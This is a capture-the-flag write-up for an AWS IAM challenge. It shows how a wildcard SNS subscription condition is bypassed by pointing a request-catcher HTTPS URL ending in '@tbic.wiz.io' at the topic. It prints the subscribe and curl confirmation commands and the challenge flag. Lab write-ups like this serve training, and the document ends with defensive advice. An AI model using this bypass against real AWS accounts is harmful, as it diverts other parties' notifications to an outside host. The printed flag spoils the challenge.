#Challenge Number # 3 – Enable Push Notifications

## Challenge Statement
This task required analyzing the provided IAM policy, determining the allowed actions, and successfully subscribing to an SNS topic to receive notifications.

---

## IAM Policy  

### Policy  
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

- I can access:  
  Allows anyone (`Principal: "*"`) to subscribe to the SNS topic.  
  Endpoints which matches `*@tbic.wiz.io` are only eligible.  

- I cannot access:  
  No permissions to publish messages (`SNS:Publish`) or manage the topic.
  Emails outside the `@tbic.wiz.io` domain cannot be used.  

---

## Solution  

1. Retrieve Available SNS Topics  
   Verified the existence of the SNS topic using:  
     ```bash
     aws sns list-topics
     ```

2. Set Up an HTTP Request Catcher 
   Since I got an error with email authentication, I opted for an HTTPS request catcher like RequestBin.

3. Subscribe to SNS Using HTTPS Protocol
   Issued a subscription request with my request catcher URL:  
     ```bash
     aws sns subscribe \
       --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
       --protocol https \
       --notification-endpoint
     https://iamchallenge3.requestcatcher.com/test@tbic.wiz.io
     ```

4. Confirm Subscription  
   SNS sent a confirmation request to my request catcher.  
   Extracted the `SubscribeURL` from the response and confirmed it using `curl`:  
     ```bash
     curl "https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a5872376d50032e89f0f1d6bbeccb363bde1a7edda0e124df1f7a46e312852d10703193cd34e7acb41c39977801d0c2d3f442155505e1959ac60cdac077ecb4e4da09bbe9935843cb3036334b9915fd95e0f934c461e5d6ebefbf70befb027d672905df0ab008a232cc334b429d2eaaf8fd"
     ```

5. Receive Notifications  
   The flag is retrived from the message field in the response
     bash
     ```
     flag: {wiz:always-suspect-asterisks}

     ```

---

## Reflection  

- At first I analysed the policy and attempted to subscribe via email but faced authentication issues due to domain restrictions. To overcome this, I switched to an HTTPS request catcher, which successfully captured notifications. The key breakthrough was realizing that an HTTP request catcher could bypass email limitations. From a security perspective, restricting SNS subscriptions to trusted AWS acounts, implementing manual approval for new subscriptions, and encrypting SNS messages would enhance protection.

